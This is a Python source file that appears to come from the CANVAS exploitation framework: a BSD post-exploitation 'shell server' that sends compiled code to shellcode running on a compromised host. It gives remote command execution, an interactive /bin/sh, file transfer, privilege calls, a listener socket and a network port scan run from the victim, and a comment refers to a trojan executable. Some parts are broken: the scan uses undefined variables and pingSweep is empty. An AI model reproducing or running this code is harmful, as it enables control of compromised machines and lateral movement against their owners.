#! /usr/bin/env python

"""
BSD MOSDEF ShellServer
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import os
import socket
import logging
from exploitutils import * # hem...

from shellserver import unixshellserver
from shellcode import shellcodeGenerator
from MOSDEFShellServer import MSSgeneric

#XXX: or whatever you've used as your trojan filename locally
#XXX: This file needs to exist in CWD locally
trojanfile="hs.exe" # XXX: fix this

class BSDShellServer(MSSgeneric, unixshellserver):

    O_RDONLY=0x0
    O_RDWR=0x2
    O_CREAT=0x40
    O_TRUNC=0x200

    AF_INET=2
    SOCK_STREAM=1
    SOCK_DGRAM=2
    SO_REUSEADDR=2

    SIG_DFL=0
    SIG_IGN=-1
    SIGCHLD=17

    def pwd(self):
        """
        calls getcwd()
        """
        ####TODO
        ret=self.getcwd()
        return ret

    def tcpportscan(self,args):
        """ TCP Connect scan from the remote host.
        Args: network to scan, startport, endport
        """
        argsL=args.split(" ")
        return self.tcpConnectScan(argsL[0],int(argsL[1]),int(argsL[2]))


    def cd(self,dest):
        if self.chdir(dest)==-1:
            return "No such directory, drive, or no permissions to access that directory."
        return "Successfully changed to %s"%(dest)

    def dounlink(self,filename):
        ret=self.unlink(filename)
        if not ret:
            return "%s was unlinked."%filename
        else:
            return "%s was not unlinked due to some kind of error."%filename

    def dospawn(self,filename):

        ret=self.spawn(filename)
        if ret!=0:
            return "%s was spawned."%(filename)
        else:
            return "%s was not spawned due to some kind of error."%filename


    def runcommand(self,command):
        """
        Runs a command via popen
        """
        data=""
        data=self.popen2(command)
        return data

    def runexitprocess(self):
        """Exit the process"""
        self.exit(1)
        return "Exited the process"

    def callzero(self):
        """call zero
        This will cause the remote server to cause an exception
        """
        print "CALLING 0"
        #call 0 to cause an exception
        self.sendrequest(intel_order(0))
        self.shutdown()
        print "Done calling zero"


     #################################################################################################
     #Our network fun


    def sendrequest(self,request):
        """
        sends a request to the remote shellcode
        """
        devlog('shellserver::sendrequest', "Sending Request")
        self.requestsize=len(request)
        request=self.order(len(request))+request
        #print "R: "+prettyprint(request)
        self.enter() #threading support added. :>
        self.node.parentnode.send(self.connection,request)
        devlog('shellserver::sendrequest', "Done sending request")
        return

    def close(self,fd):
        print "BSD Closing FD %s"%fd
        vars={}
        vars["fdtoclose"]=fd


        code="""
        //start of code
        #import "local","close" as "close"
        #import "int","fdtoclose" as "fdtoclose"
        #import "local","sendint" as "sendint"

        void main()
        {
        int i;
        i=close(fdtoclose);
        sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint(signed=True)
        self.leave()
        return ret

    def getpid(self):
        """
        A simple getpid
        """
        vars={}

        code="""
        //start of code
        #import "local","getpid" as "getpid"
        #import "local","sendint" as "sendint"

        void main()
        {
          int i;
          i=getpid();
          sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint(signed=True)
        self.leave()
        return ret

    def getppid(self):
        """
        A simple getppid
        """
        vars={}

        code="""
        //start of code
        #import "local","getppid" as "getppid"
        #import "local","sendint" as "sendint"
        void main()
        {
          int i;
          i=getppid();
          sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint(signed=True)
        self.leave()
        return ret

    def exit(self,exitcode):
        vars={}
        vars["exitcode"]=exitcode


        code="""
        //start of code
        #import "local","exit" as "exit"
        #import "int","exitcode" as "exitcode"

        void main()
        {
          int i;
          i=exit(exitcode);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        #ret=self.readint() #we're gone!
        self.leave()
        return

    def seteuid(self,euid):
        vars={}
        vars["euid"]=int(euid)


        code="""
        //start of code
        #import "local","seteuid" as "seteuid"
        #import "int","euid" as "euid"
        #import "local", "sendint" as "sendint"

        void main()
        {
          int i;
          i=seteuid(euid);
          sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint(signed=True)
        self.leave()

        return ret

    def getids(self):
        uid,euid,gid,egid=self.ids()
        return "UID=%d EUID=%d GID=%d EGID=%d"%(uid,euid,gid,egid)

    def ids(self):
        vars={}


        code="""
        //start of code
        #import "local","getuid" as "getuid"
        #import "local","geteuid" as "geteuid"
        #import "local","getgid" as "getgid"
        #import "local","getegid" as "getegid"
        #import "local","sendint" as "sendint"

        void main()
        {
          int i;
          i=getuid();
          sendint(i);
          i=geteuid();
          sendint(i);
          i=getgid();
          sendint(i);
          i=getegid();
          sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        uid=self.readint() #we're gone!
        euid=self.readint() #we're gone!
        gid=self.readint() #we're gone!
        egid=self.readint() #we're gone!
        self.leave()

        return (uid,euid,gid,egid)

    def open(self,filename,flags,mode=0777): # 777
        vars={}
        vars["filename"]=filename
        vars["flags"]=flags
        vars["mode"]=mode

        code="""
        //start of code
        #import "local","open" as "open"
        #import "local","sendint" as "sendint"
        #import "string","filename" as "filename"
        #import "int","flags" as "flags"
        #import "int","mode" as "mode"

        void main()
        {
          int i;
          i=open(filename,flags,mode);
          sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint(signed=True)
        self.leave()

        return ret

    def chdir(self,dir):
        """
        inputs: the filename to open
        outputs: returns -1 on failure, otherwise a file handle
        truncates the file if possible and it exists
        """
        vars={}
        vars["dir"]=dir
        self.clearfunctioncache()
        request=self.compile("""
        //start of code
        #import "local","sendint" as "sendint"
        #import "local","chdir" as "chdir"
        #import "string","dir" as "dir"
        //#import "local","debug" as "debug"

        void main()
        {
        int i;
        //debug();
        i=chdir(dir);
        sendint(i);
        }
        """,vars)

        self.sendrequest(request)
        fd=self.readint(signed=True)
        self.leave()

        return fd

    def signal(self,signum,action):
        """
        Calls signal to get the signal handler set
        """
        vars={}
        vars["signum"]=signum
        vars["sighandler"]=action
        self.clearfunctioncache()
        request=self.compile("""
        #import "local","sendint" as "sendint"
        #import "int", "signum" as "signum"
        #import "int", "sighandler" as "sighandler"
        #import "local", "signal" as "signal"

        void main()
        {
          int i;
          i=signal(signum,sighandler);
          sendint(i);
         }
        """,vars)
        self.sendrequest(request)
        ret=self.readint(signed=True)
        #print "Ret=%s"%ret
        self.leave()

        return ret

    def getcwd(self):
        """
        inputs: none
        outputs: returns the current working directory as a string
        """
        vars={}
        self.clearfunctioncache()
        request=self.compile("""
        #import "local","sendstring" as "sendstring"
        #import "local","getcwd" as "getcwd"

        //start of code
        void main()
        {
        int i;
        char dest[2000];
        //getcwd (char * buffer, int size)
        //i=syscall2(183,dest,1024);
        i=getcwd(dest,1024);
        //i has the length of the string.
        sendstring(dest);
        }
        """,vars)

        self.sendrequest(request)
        #fd=self.readint()
        #print "FD=%d"%fd
        #ret=fd
        ret=self.readstring()
        #print "Ret=%s"%ret
        self.leave()

        return ret

    def fexec(self,command,args,env):
        """
        calls fork execve
        """

        code=""
        vars={}
        vars["command"]=command
        i=0
        for a in args:
            vars["arg%d"%i]=a
            code+="#import \"string\",\"arg%d\" as \"arg%d\""%(i,i)
            i+=1
        i=0
        for e in env:
            vars["env%d"%i]=e
            code+="#import \"string\",\"env%d\" as \"env%d\""%(i,i)
            i+=1
        maxargs=len(args)
        maxenv=len(env)

        code+="""
          //start
#import "local", "close" as "close"
#import "local", "execve" as "execve"
#import "local", "read" as "read"
#import "local", "fork" as "fork"
#import "string", "command" as "command"

//#import "local", "debug" as "debug"
#import "local", "exit" as "exit"
#import "local", "memset" as "memset"
#import "local", "waitpid" as "waitpid"


void main()
{
          int pipes[2];
          int bpipes[2];
          char buf[1001];
          char *argv[ARGVNUM];
          char *envp[ENVNUM];
          int ret;
          int pid;

          //pipes[0] is now for reading and pipes[1] for writing

          """
        code=code.replace("ARGVNUM",str(maxargs+1))
        code=code.replace("ENVNUM",str(maxenv+1))
        code+="envp[%d]=0;\n"%maxenv
        code+="argv[%d]=0;\n"%maxargs
        for i in range(0,maxargs):
            code+="argv[%d]=arg%d;\n"%(i,i)
        for i in range(0,maxenv):
            code+="envp[%d]=env%d;\n"%(i,i)
        code+="""
           //now we fork and exec and read from the socket until we are done
           pid=fork();
           if (pid==0)
           {
              //child
              close(1);
              close(2);
              execve(command,argv,envp);
              exit(1); //in case it failed
           }

           //we do this twice in the event that
           //our previous process did not exit by now...
           //we could listen for pid, but instead, we listen for any process
           //that is a zombie
           waitpid(-1,0,1); //wnohang is 1
           waitpid(-1,0,1); //wnohang is 1
           }

        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        self.leave()

        return



    def popen2(self,command):
        """
        runs a command and returns the result
        Note how it uses TCP's natural buffering, and
        doesn't require a ping-pong like protocol.
        """

        vars={}
        vars["command"]=command
        vars["shell"]="/bin/sh"
        vars["dashc"]="-c"
        code="""
          //start
#import "string","command" as "command"
#import "string","dashc" as "dashc"
#import "string","shell" as "shell"

#import "local","pipe" as "pipe"
#import "local", "dup2" as "dup2"
#import "local", "close" as "close"
#import "local", "execve" as "execve"
#import "local", "read" as "read"
#import "local", "fork" as "fork"

#import "local", "debug" as "debug"
#import "local", "exit" as "exit"
#import "local", "memset" as "memset"
#import "local", "sendstring" as "sendstring"
#import "local", "waitpid" as "waitpid"


void main()
{
          int pipes[2];
          int bpipes[2];
          char buf[1001];
          char *argv[4];
          char **envp;
          int ret;
          int pid;

          //pipes[0] is now for reading and pipes[1] for writing

          envp=0;
          argv[0]=shell;
          argv[1]=dashc;
          argv[2]=command;
          argv[3]=0;
           //debug();
           //now we fork and exec and read from the socket until we are done
           ret=pipe(pipes);
           ret=pipe(bpipes);

           pid=fork();
           if (pid==0)
           {
              //child
              close(0);
              close(1);
              close(2);
              ret=dup2(pipes[0],0);
              ret=dup2(bpipes[1],1);
              ret=dup2(bpipes[1],2);
              close(bpipes[0]);
              //debug();
              execve(shell,argv,envp);
              exit(1); //in case it failed
           }
           ret=close(bpipes[1]);
           ret=close(pipes[0]);
           memset(buf,0,1001);
           //debug();
           while (read(bpipes[0],buf,1000)>0) {
              sendstring(buf);
              memset(buf,0,1001);
           }
           //debug();
           //send blank string...
           sendstring(buf);
           close(pipes[1]);
           close(bpipes[0]);
           //we do this twice in the event that
           //our previous process did not exit by now...
           //we could listen for pid, but instead, we listen for any process
           //that is a zombie
           waitpid(-1,0,1); //wnohang is 1
           waitpid(-1,0,1); //wnohang is 1
           }

        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        tmp=self.readstring()
        data=tmp
        while tmp != "":
            tmp=self.readstring()
            data+=tmp
        self.leave()

        return data

    def shellshock(self, logfile=None):
        """
        implements an interactive shell for people who don't want to use MOSDEF
        """

        vars={}
        vars["shell"]="/bin/sh"
        vars["dashi"]="-i"
        vars["mosdefd"]=self.fd

        code="""
#import "string", "dashi" as "dashi"
#import "string", "shell" as "shell"
#import "int", "mosdefd" as "mosdefd"

#import "local", "pipe" as "pipe"
#import "local", "dup2" as "dup2"
#import "local", "close" as "close"
#import "local", "execve" as "execve"
#import "local", "read" as "read"
#import "local", "fork" as "fork"
#import "local", "write" as "write"
#import "local", "sendstring" as "sendstring"
#import "local", "sendint" as "sendint"
#import "local", "select" as "select"
#import "local", "memset" as "memset"
#import "local", "exit" as "exit"

void main()
{
  char *exec[3];
  char in[512];
  char out[512];

  int pid;
  int rfd;
  int wfd;
  int len;
  int n;
  int i;
  int div;
  int tmp;
  int rfdindex;
  int mosindex;
  int mosoffset;
  int rfdoffset;
  int crfds;
  int mosisset;

  int localmask[32];
  int write_pipe[2];
  int read_pipe[2];

  exec[0] = shell;
  exec[1] = dashi;
  exec[2] = 0;

  pipe(write_pipe);
  pipe(read_pipe);

  pid = fork();

  if (pid == 0)
  {
    close(0);
    close(1);
    close(2);
    dup2(write_pipe[0], 0);
    dup2(read_pipe[1], 1);
    dup2(read_pipe[1], 2);
    close(read_pipe[0]);
    execve(exec[0], exec, 0);
    exit(1);
  }

  close(read_pipe[1]);
  close(write_pipe[0]);
  rfd = read_pipe[0];
  wfd = write_pipe[1];

  rfdindex = 0;

  if (rfd > 31)
  {
    rfdindex = rfd;
    while(rfdindex > 31)
    {
      rfdindex = rfdindex - 32;
    }
  }
  else
  {
    rfdindex = rfd;
  }
  mosindex = 0;
  if (mosdefd > 31) {
    mosindex = mosdefd;
    while(mosindex > 31) {
      mosindex = mosindex - 32;
    }
  }
  else {
    mosindex = mosdefd;
  }

  i = 0;
  div = rfd;
  while (div > 31)
  {
      i = i+1;
      div = div - 32;
  }
  rfdoffset = i;
  i = 0;
  div = mosdefd;
  while (div > 31)
  {
      i = i+1;
      div = div - 32;
  }
  mosoffset = i;

  while(1)
  {
    memset(&localmask, 0, 128);
    localmask[rfdoffset] = 1<<rfdindex;
    tmp = localmask[mosoffset];
    div = 1<<mosindex;
    localmask[mosoffset] = tmp | div;

    // oi vey, ok both in mask

    if (rfd > mosdefd)
    {
      n = rfd + 1;
    }
    else
    {
      n = mosdefd + 1;
    }

    crfds = 0;
    mosisset = 0;
    if (select(n, &localmask, 0, 0, 0) > 0)
    {

// hahaha, i know...i reeeealllly need to do some proper select macros :P

      tmp = localmask[mosoffset];
      mosisset = tmp>>mosindex;
      mosisset = mosisset & 1;
      tmp = localmask[rfdoffset];
      crfds = tmp>>rfdindex;
      crfds = crfds & 1;

      if (mosisset == 1)
      {
        memset(&out, 0, 512);
        len = read(mosdefd, out, 511);
        if (len > 0)
        {
          write(wfd, out, len);
        }
      }
      if (crfds == 1)
      {
        memset(&in, 0, 512);
        len = read(rfd, in, 511);
        if (len > 0)
        {
          sendstring(in);
        }
        else
        {
          sendint(0);
          return;
        }
      }
    }
    else
    {
      sendint(0);
      return;
    }
  }
}
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret = self.shellshock_loop(endian="little", logfile=logfile)

        self.leave()
        return

    def readfromfd(self,fd,filesize):
        """ Reads from a open fd on the remote host """

        vars={}
        vars["bufsize"]=filesize
        vars["socketfd"]=self.fd
        vars["filefd"]=fd
        code="""
        #import "local", "read" as "read"
        #import "local", "writeblock" as "writeblock"
        //#import "local", "debug" as "debug"
        #import "int", "bufsize" as "bufsize"
        #import "int", "socketfd" as "socketfd"
        #import "int", "filefd" as "filefd"

        void main () {
          char buf[1001];
          int left;

          left=bufsize;
           //debug();
           while (left>1000) {
            read(filefd,buf,1000);
            writeblock(socketfd,buf,1000);
            left=left-1000;
           }

           if (left>0) {
            read(filefd,buf,left);
            writeblock(socketfd,buf,left);
           }

          }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        data=self.readbuf(filesize)

        self.leave()
        return data

    def writetofd(self,fd,data):
        """
        Writes all the data in data to fd
        """

        vars={}
        vars["bufsize"]=len(data)
        vars["socketfd"]=self.fd
        vars["filefd"]=fd

        code="""
        #import "local", "readblock" as "readblock"
        #import "local", "write" as "write"
        //#import "local", "debug" as "debug"
        #import "int", "bufsize" as "bufsize"
        #import "int", "socketfd" as "socketfd"
        #import "int", "filefd" as "filefd"

        void main () {
          char buf[1001];
          int left;

           left=bufsize;
           //debug();
           while (left>1000) {
            readblock(socketfd,buf,1000);
            write(filefd,buf,1000);
            left=left-1000;
           }

           if (left>0) {
            readblock(socketfd,buf,left);
            write(filefd,buf,left);
           }
          }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        self.writebuf(data)
        self.leave()

        return

    def setblocking(self,fd,blocking):
        code="""
        #import "local", "fcntl" as "fcntl"
        #import "int", "O_NONBLOCK" as "O_NONBLOCK"
        #import "int", "O_BLOCK" as "O_BLOCK"
        #import "int", "sock" as "sock"
        #import "int", "F_SETFL" as "F_SETFL"
        #import "int", "F_GETFL" as "F_GETFL"

        void main() {
          int opts;

          opts=fcntl(sock,F_GETFL,0); //MOSDEF uses a null arg
          """
        if blocking:
            #set blocking by clearing the nonblocking flag
            code+="opts=opts & O_BLOCK;\n"
        else:
            #set nonblocking
            code+="opts=opts | O_NONBLOCK;\n"
        code+="""
          fcntl(sock,F_SETFL,opts);
        }
        """
        vars={}
        vars["O_NONBLOCK"]=0x800
        vars["O_BLOCK"]=~0x800
        vars["sock"]=fd
        vars["F_SETFL"]=4
        vars["F_GETFL"]=3
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        self.leave()

        return

    def setsockopt(self,fd,option,arg):
        code="""
        #import "local", "setsockopt" as "setsockopt"
        #import "int","arg" as "arg"
        #import "int","option" as "option"
        #import "int","level" as "level"
        #import "int", "sock" as "sock"

        void main() {
           setsockopt(sock,level, option,arg);
        }
        """
        vars={}
        vars["option"]=option
        vars["arg"]=arg
        vars["sock"]=fd
        vars["level"]=1 #SOL_SOCKET
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        self.leave()

        return

    def getrecvcode(self,fd,length):
        devlog('shellserver::getrecvcode', "Creating recv code for fd %d of length %d" % (fd, length))
        code="""
        #import "local", "recv" as "recv"
        #import "local", "writeblock2self" as "writeblock2self"
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"

        void main()
        {
            int i;
            char buf[1000];
            int wanted;
            //flags set to zero here
            wanted=length;
            while (wanted > 0 ) {
             if (wanted < 1000) {
               i=recv(fd,buf,wanted,0);
             }
             else
             {
              i=recv(fd,buf,1000,0);
             }
             if (i<0)
               {
                writeblock2self(buf,0);
                wanted=0;
               }
             else
             {
              writeblock2self(buf,i);
              wanted=wanted-i;
             }

            }
          }
        """
        vars={}
        vars["fd"]=fd
        vars["length"]=int(length)
        self.clearfunctioncache()
        message=self.compile(code,vars)
        return message

    def isactive(self,fd,timeout=0):
        """
        Checks to see if fd is readable
        """

        if timeout==None:
            timeout=0
        code="""
        #import "local","select" as "select"
        #import "local","FD_ZERO" as "FD_ZERO"
        #import "local","FD_SET" as "FD_SET"
        #import "int" , "readfd" as "readfd"
        #import "int" , "timeout" as "timeout"
        #import "local", "sendint" as "sendint"

        struct timeval {
          int tv_sec;
          int tv_usec;
        };

        void main() {
            int nfds;
            int read_fdset[32];
            struct timeval tv;
            int i;

            tv.tv_sec=timeout;
            tv.tv_usec=0;

            nfds=readfd+1;
            FD_ZERO(read_fdset);
            FD_SET(readfd,read_fdset);
            i=select(nfds, read_fdset, 0, 0, &tv);
            if (i>0) {
              sendint(1);
            }
            else {
              sendint(0);
            }
        }
        """
        vars={}
        vars["timeout"]=timeout
        vars["readfd"]=fd
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        ret=self.readint()
        self.leave()
        return ret


    def recv_lazy(self,fd,timeout=None,length=1000):
        """Get whatever is there"""
        print "In recv_lazy fd=%d"%fd
        if timeout==None:
             timeout=0 #immediately return
        if length>1000:
             length=1000

        code="""
        #import "local", "recv" as "recv"
        #import "local", "sendblock2self" as "sendblock2self"
        #import "int", "fd" as "fd"
        #import "int", "timeout" as "timeout"
        #import "int", "length" as "length"
        #import "local", "poll" as "poll"

        struct pollfd {
          int fd;
          short events;
          short revents;
        };

        void main()
        {
            int i;
            char buf[1000];
            int r;
            struct pollfd ufds;

            ufds.fd=fd;
            ufds.events=1;
            //timeout is in ms
            i=poll(&ufds,1,timeout);
            r=ufds.revents & 1;

            if (r>0) {
            //flags set to zero here
              i=recv(fd,buf,length,0);
            }
            else
            {
             i=-1;
            }
            if (i<0)
            {
            //we use send because we have no idea how much we're recieving
              sendblock2self(buf,0);
            }
            else
            {
              sendblock2self(buf,i);
            }
          }
        """
        vars={}
        vars["fd"]=fd
        vars["timeout"]=timeout
        vars["length"]=length
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        devlog('MOSDEFSock::readblock', "Before readblock")
        buffer=self.readblock()
        devlog('MOSDEFSock::readblock', "After readblock")
        self.leave()

        return buffer

    def accept(self,fd):
        code="""
        #import "local", "accept" as "accept"
        #import "int", "fd" as "fd"
        #import "local", "sendint" as "sendint"
        #include "socket.h"
        void main()
        {
          int i;
          struct sockaddr_in sa;
          int len;
          i=accept(fd, &sa, &len);
          sendint(i);
          sendint(sa.addr);
        }
        """
        vars={}
        vars["fd"]=fd
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        ret=self.readint(signed=True)
        addr=self.readint()
        self.leave()

        return ret

    def getsendcode(self,fd,buffer):
        """Reliable send to socket, returns a shellcode for use by Node and self"""
        devlog('shellserver::getsendcode', "Sending %d bytes to fd %d" % (len(buffer), fd))
        code="""
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"
        #import "string", "buffer" as "buffer"
        #import "local", "send" as "send"
        void main()
        {
           int i;
           char *p;
           int wanted;
           wanted=length;
           p=buffer;
           while (wanted > 0 ) {
           i=send(fd,p,wanted,0); // flags set to zero here
           if (i<0) {
             wanted=0;
             return;
            }
            wanted=wanted-i;
            p=p+i;
           }
         }
        """
        vars={}
        vars["fd"]=fd
        vars["length"]=len(buffer)
        vars["buffer"]=buffer
        self.clearfunctioncache()
        message=self.compile(code,vars)
        #self.leave()

        return message

    def send(self,fd,buffer):
        """
        reliable send to socket
        """
        message=self.getsendcode(fd,buffer)
        self.sendrequest(message)
        self.leave()

        return

    def socket(self,proto):
        """
        calls socket and returns a file descriptor or -1 on failure.
        """
        print "BSD Socket(%s)"%proto
        code="""
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "proto" as "proto"
        #include "socket.h"
        #import "local", "socket" as "socket"
        #import "local", "sendint" as "sendint"

        void main()
        {
           int i;
           i=socket(AF_INET,proto,0);
           sendint(i);
        }
        """
        if proto.lower()=="tcp":
            proto=self.SOCK_STREAM
        elif proto.lower()=="udp":
            proto=self.SOCK_DGRAM
        else:
            print "Don't know anything about protocol %s in socket()"%proto
            return -1

        vars={}
        vars["proto"]=proto
        vars["AF_INET"]=self.AF_INET

        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        ret=self.readint(signed=True)
        self.leave()
        print "BSD: Got socket %d"%ret
        return ret

    def connect(self,fd,host,port,proto,timeout):
        if proto.lower()=="tcp":
            proto=self.SOCK_STREAM
        elif proto.lower()=="udp":
            proto=self.SOCK_DGRAM
        else:
            print "Protocol not recognized"
            return -1
        return self.connect_sock(fd,host,port,proto,timeout)

    def connect_sock(self,fd,host,port,proto,timeout):
        """
        Does a tcp connect with a timeout
        """
        print "Doing connect_sock with fd=%s host=%s port=%s timeout=%s"%(fd,host,port,timeout)
        code="""
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "SOL_SOCKET" as "SOL_SOCKET"
        #import "int", "SO_ERROR" as "SO_ERROR"
        #import "int", "ip" as "ip"
        #import "int", "port" as "port"
        #import "int", "proto" as "proto"
        #import "int", "sockfd" as "sockfd"
        #import "int", "timeout" as "timeout"
        #include "socket.h"
        #import "local", "connect" as "connect"
        #import "local", "close" as "close"
        #import "local", "socket" as "socket"
        #import "local", "sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"
        #import "local", "select" as "select"
        #import "local", "memset" as "memset"
        //#import "local", "debug" as "debug"
        #import "int", "F_SETFL" as "F_SETFL"
        #import "int", "F_GETFL" as "F_GETFL"
        #import "local", "fcntl" as "fcntl"
        #import "int", "O_NONBLOCK" as "O_NONBLOCK"
        #import "int", "O_BLOCK" as "O_BLOCK"
        #import "local", "getsockopt" as "getsockopt"

        struct timeval {
                int tv_sec;
                int tv_usec;
        };

        void main()
        {
          int mask[32];
          int tmpmask;
          int i;
          int ret;
          int ilen;
          int div;
          int n;
          int sockopt;
          int fdindex;
          int opts;
          struct timeval tv;
          struct sockaddr_in serv_addr;
          serv_addr.family=AF_INET; //af_inet

          //sockfd is set on MOSDEFSock init
          //sockfd=socket(AF_INET,SOCK_STREAM,0);

          //debug();
          serv_addr.addr=htonl(ip);
          serv_addr.port=htons(port);

          tv.tv_usec= 0;
          tv.tv_sec = timeout;

          memset(&mask, 0, 128);
          // we don't have a modulus so doing it like this
          fdindex = 0;
          if (sockfd > 31) {
              fdindex = sockfd;
              while (fdindex > 31) {
                  fdindex = fdindex - 32;
              }
          }
          else {
              fdindex = sockfd;
          }
          i = 0;
          div = sockfd;
          // we didnt do '/' yet when i wrote this
          while (div > 31)
          {
              i = i+1;
              div = div - 32;
          }
          //debug();
          mask[i] = 1<<fdindex;

          // set to non-blocking
          opts=fcntl(sockfd, F_GETFL, 0);
          opts=opts | O_NONBLOCK;
          fcntl(sockfd, F_SETFL, opts);

          ret = connect(sockfd,&serv_addr,16);

          //TODO: Fix this for BSD using our errno
          if (ret < 0) {
                //should send a different errno for timeout
                sendint(-1);

          }
          else {


          // connect (with timeout) succeeded

          // set back to blocking
          opts=fcntl(sockfd, F_GETFL, 0);
          opts=opts & O_BLOCK;
          fcntl(sockfd, F_SETFL, opts);

          sendint(0);
          }
        }
        """

        hostlong=socket.gethostbyname(host) #resolve from remotehost
        hostlong=str2bigendian(socket.inet_aton(hostlong))

        vars={}
        vars["AF_INET"]=self.AF_INET
        vars["ip"]=hostlong
        vars["port"]=port
        vars["proto"]=proto
        vars["sockfd"]=fd
        vars["timeout"]=timeout
        vars["F_SETFL"]=4
        vars["F_GETFL"]=3
        vars["O_NONBLOCK"]=0x800
        vars["O_BLOCK"]=~0x800
        vars["SOL_SOCKET"]=1
        vars["SO_ERROR"]=4

        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        ret=self.readint(signed=True)
        self.leave()

        return ret


          ##################################################################################################
          #non-libc like things. Advanced modules. Etc.

    def getListenSock(self,addr,port):
         """
         Creates a tcp listener socket fd on a port
         """
         vars={}
         code="""
         #import "local", "bind" as "bind"
         #import "local", "listen" as "listen"
         #import "local", "socket" as "socket"
         #import "local", "sendint" as "sendint"
         #import "local", "htons" as "htons"
         #import "local", "htonl" as "htonl"
         #import "int", "addr" as "addr"
         //#import "local", "debug" as "debug"
         #import "int", "port" as "port"
         #import "int", "AF_INET" as "AF_INET"
         #import "int", "SOCK_STREAM" as "SOCK_STREAM"
         #include "socket.h"

         void main()
         {
           int sockfd;
           int i;
           struct sockaddr_in serv_addr;

           serv_addr.family=AF_INET; //af_inet

           sockfd=socket(AF_INET,SOCK_STREAM,0);
           serv_addr.port=htons(port);
           serv_addr.addr=addr;
           i=bind(sockfd,&serv_addr,16);
           if (i!=-1) {
             i=listen(sockfd,16);
             if (i!=-1) {
                sendint(sockfd); //success
             }
            else {
             sendint(-2); //failed to listen
            }
           }
           else {
            sendint(-1); //failed to bind

           }

         }
         """
         vars["port"]=port
         vars["addr"]=intel_str2int(socket.inet_aton(addr))
         vars["AF_INET"]=self.AF_INET
         vars["SOCK_STREAM"]=self.SOCK_STREAM
         self.clearfunctioncache()
         request=self.compile(code,vars)
         self.sendrequest(request)
         fd=self.readint(signed=True)
         self.leave()

         return fd

    def tcpConnectScan(self,network,startport=1,endport=1024):
        """
        Connectscan from the remote host!
        """

        if network.count("/"):
            network,netmask=network.split("/")
        else:
            netmask=32
        netmask=int(netmask)

        hostlong=socket.gethostbyname(network) #resolve from remotehost
        hostlong=str2bigendian(socket.inet_aton(hostlong))
        numberofips=2**(32-netmask) #how many ip's total
        startip=hostlong&(~(numberofips-1)) #need to mask it out so we don't do wacky things

        vars={}
        vars["startip"]=startip
        vars["numberofips"]=numberofips
        vars["AF_INET"]=self.AF_INET
        vars["SOCK_STREAM"]=self.SOCK_STREAM
        vars["startport"]=startport
        vars["endport"]=endport
        code="""
        #import "local", "connect" as "connect"
        #import "local", "close" as "close"
        #import "local", "socket" as "socket"
        #import "local", "sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"
        #import "local", "debug" as "debug"
        #import "int", "startip" as "startip"
        #import "int", "startport" as "startport"
        #import "int", "endport" as "endport"
        #import "int", "numberofips" as "numberofips"
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "SOCK_STREAM" as "SOCK_STREAM"
        #include "socket.h"

        void main()
        {
          int currentport;
          int sockfd;
          int fd;
          int doneips;
          int currentip;

          struct sockaddr_in serv_addr;

          serv_addr.family=AF_INET; //af_inet
          currentip=startip;
          doneips=0;

          while (doneips<numberofips)
          {
               //FOR EACH IP...
               doneips=doneips+1;
               serv_addr.addr=htonl(currentip);
               currentport=startport;
               while (currentport<endport) {
                 //FOR EACH PORT
                 //debug();
                 sockfd=socket(AF_INET,SOCK_STREAM,0);
                 //debug();
                 serv_addr.port=htons(currentport);
                 if (connect(sockfd,&serv_addr,16)==0) {
                   //sendint(23);
                   sendint(currentport);
                 }
                 //debug();
                 //sendint(22);
                 close(sockfd);
                 //sendint(20);
                 currentport=currentport+1;
                 //sendint(21);
                }
               currentip=currentip+1;
          }
         sendint(0xffffffff);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        while port!=-1:
            port=self.readint(signed=True)
            if port!=-1:
                openports.append(port)
        self.leave()

        return openports

    def pingSweep(self,network):
        """
        pingsweep the target network
        """

#### NEW CLASS - i386 ####

from MOSDEF.bsdremoteresolver import x86bsdremoteresolver
class BSD_i386(BSDShellServer, MSSgeneric, unixshellserver, x86bsdremoteresolver):
    """
    This is the BSD MOSDEF Shell Server Class
    """

    def __init__(self,connection,node,logfunction=None, proctype='i386'):
        x86bsdremoteresolver.__init__(self)
        unixshellserver.__init__(self,connection,node,type="Active",logfunction=logfunction)
        MSSgeneric.__init__(self, 'x86')
        self.libraryDict = {}
        self.functionDict = {}
        self.order = intel_order
        self.unorder = istr2int
